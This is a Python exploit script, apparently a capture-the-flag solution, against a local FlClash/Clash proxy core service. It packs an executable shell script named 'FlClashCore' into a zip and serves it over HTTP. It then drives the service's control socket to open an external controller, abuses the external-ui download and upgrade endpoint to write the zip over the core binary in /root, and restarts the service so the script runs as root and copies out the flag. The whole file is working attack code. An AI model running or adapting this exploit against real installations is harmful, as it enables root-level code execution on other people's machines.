import requests
import socket
import time
import json
import subprocess
import zipfile

with zipfile.ZipFile('/tmp/pwn.zip', 'w') as zipf:
    info = zipfile.ZipInfo('FlClashCore')
    info.external_attr = 0o777 << 16
    zipf.writestr(info, '#!/bin/bash\ncat /root/flag_* > /tmp/flag\n')

subprocess.Popen('python3 -m http.server 11455 --bind 127.0.0.1 --directory /tmp/', shell=True)

ss = socket.socket()
ss.bind(('127.0.0.1', 11451))
ss.listen()

res = requests.post(
    'http://127.0.0.1:47890/start',
    json={
        'path': '...',
        'arg': '11451',
    },
)
print('start flclash', res.text)

s, addr = ss.accept()
print('accepted', addr)

payload = {'id': 'x1', 'method': 'initClash', 'data': json.dumps({
    'home-dir': '/root',
    'version': 114514,
})}
s.send(json.dumps(payload).encode() + b'\n')
time.sleep(.5)

payload = {'id': 'x2', 'method': 'setupConfig', 'data': json.dumps({})}
s.send(json.dumps(payload).encode() + b'\n')
time.sleep(.5)

payload = {'id': 'x3', 'method': 'updateConfig', 'data': json.dumps({
    'external-controller': '127.0.0.1:11452',
})}
s.send(json.dumps(payload).encode() + b'\n')
time.sleep(1)

print(s.recv(9999).decode())

res = requests.put('http://127.0.0.1:11452/configs', json={
    'payload': json.dumps({
        'log-level': 'debug',
        'external-ui': '/root',
        'external-ui-url': 'http://127.0.0.1:11455/pwn.zip',
        'external-ui-name': 'secure',
    }),
})
print(res.status_code, res.text)

res = requests.post('http://127.0.0.1:11452/upgrade/ui')
print(res.status_code, res.text)

res = requests.post(
    'http://127.0.0.1:47890/start',
    json={
        'path': '...',
        'arg': '11451',
    },
)
print('fire flclash', res.text)

time.sleep(.5)
subprocess.run('ls -al /tmp', shell=True)
subprocess.run('cat /tmp/flag', shell=True)
